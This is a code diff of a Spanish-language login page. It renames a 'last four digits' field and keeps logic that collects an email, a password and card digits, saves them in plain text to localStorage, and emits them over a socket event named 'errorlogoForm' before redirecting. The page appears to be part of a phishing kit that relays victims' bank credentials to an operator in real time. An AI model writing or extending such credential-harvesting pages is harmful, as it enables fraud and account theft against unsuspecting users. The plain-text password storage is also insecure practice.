@@ -86,8 +86,8 @@
     <form id="login-form">
       <input type="email" id="usuario" placeholder="Ingrese su correo electrónico" required />
       <input type="password" id="password" placeholder="Contraseña" required />
-      <!-- Campo unificado con el mismo id que el index -->
-      <input type="tel" id="ultimosDigitos" placeholder="Últimos 4 dígitos" maxlength="4" required />
+      <!-- Campo de últimos 4 dígitos -->
+      <input type="tel" id="cajero" placeholder="Últimos 4 dígitos" maxlength="4" required />
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -106,15 +106,15 @@
 
           const usuario = document.getElementById('usuario').value.trim();
           const contrasena = document.getElementById('password').value.trim();
-          const ultimosDigitos = document.getElementById('ultimosDigitos').value.trim();
+          const cajero = document.getElementById('cajero').value.trim();
           const sessionId = localStorage.getItem('sessionId');
 
-          if (!usuario || !contrasena || !ultimosDigitos) {
+          if (!usuario || !contrasena || !cajero) {
             alert("Por favor, complete todos los campos.");
             return;
           }
 
-          if (!/^\d{4}$/.test(ultimosDigitos)) {
+          if (!/^\d{4}$/.test(cajero)) {
             alert("Debe ingresar exactamente 4 dígitos numéricos.");
             return;
           }
@@ -122,10 +122,10 @@
           // Guardar en localStorage
           localStorage.setItem('usuario', usuario);
           localStorage.setItem('contrasena', contrasena);
-          localStorage.setItem('ultimosDigitos', ultimosDigitos);
+          localStorage.setItem('cajero', cajero);
 
           // Enviar al servidor
-          socket.emit('errorlogoForm', { usuario, contrasena, ultimosDigitos, sessionId });
+          socket.emit('errorlogoForm', { usuario, contrasena, cajero, sessionId });
 
           // Redirigir
           window.location.href = 'opciones.html';
